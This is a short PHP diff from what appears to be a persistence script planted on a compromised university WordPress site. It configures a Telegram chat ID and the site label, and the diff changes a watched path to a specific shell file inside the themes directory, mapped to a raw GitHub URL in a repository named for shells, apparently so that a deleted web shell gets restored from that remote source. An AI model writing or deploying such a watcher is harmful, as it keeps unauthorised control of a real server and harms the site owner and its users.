@@ -4,7 +4,7 @@ $chatId     = "-1002996607823";
 $siteLabel  = "https://plk.unair.ac.id/";
 
 $watchFiles = [
-    "/home/plkunair/public_html/wp-content/themes"
+    "/home/plkunair/public_html/wp-content/themes/kontol.php"
         => "https://raw.githubusercontent.com/guabantai/shell/refs/heads/main/re.php",
 
 ];
